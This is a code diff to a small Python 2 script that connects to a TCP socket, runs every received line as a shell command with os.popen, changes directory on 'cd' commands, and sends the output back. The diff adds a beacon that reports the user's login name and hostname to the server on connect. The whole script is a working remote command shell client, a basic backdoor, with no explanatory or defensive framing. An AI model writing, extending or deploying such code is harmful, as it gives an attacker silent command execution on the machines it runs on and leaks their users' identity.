@@ -1,6 +1,5 @@
 import socket
-from os import popen
-from os import chdir
+import os
 import sys
 
 TCP_IP = '127.0.0.1'
@@ -16,13 +15,17 @@ fsock = open('out.log', 'w')
 ##sys.stdout = fsock
 ##sys.stderr = fsock
 
+login = os.getlogin()
+hostname = socket.gethostname()
+
+
+s.send("login:" + login + ":" + hostname + "\n")
+
 while (1):
     data = s.recv(BUFFER_SIZE)
     if (data[:3] == "cd "):
-        chdir(data[3:len(data) - 1])
+        os.chdir(data[3:len(data) - 1])
     else:
-        ret = popen(data)
+        ret = os.popen(data)
         s.send(ret.read())
-
 s.close()
-print "received data:", data
